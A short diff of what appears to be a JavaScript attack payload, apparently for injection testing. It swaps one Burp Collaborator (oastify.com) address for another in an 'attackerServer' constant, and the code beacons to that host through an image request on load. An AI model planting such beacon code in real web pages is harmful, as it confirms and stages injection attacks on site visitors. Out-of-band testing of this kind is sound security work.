@@ -1,7 +1,7 @@
 (function() {
      console.log('[PAYLOAD STARTED]');
 
-     const attackerServer = 'https://8dmzi1s1ywtqm03kvxyjawh8fzlq9jx8.oastify.com';
+     const attackerServer = 'https://k2nb7dhdn8i2bcswk9nvz86k4ba5yvmk.oastify.com';
 
      (new Image()).src = attackerServer + '/ping?status=loaded';
 
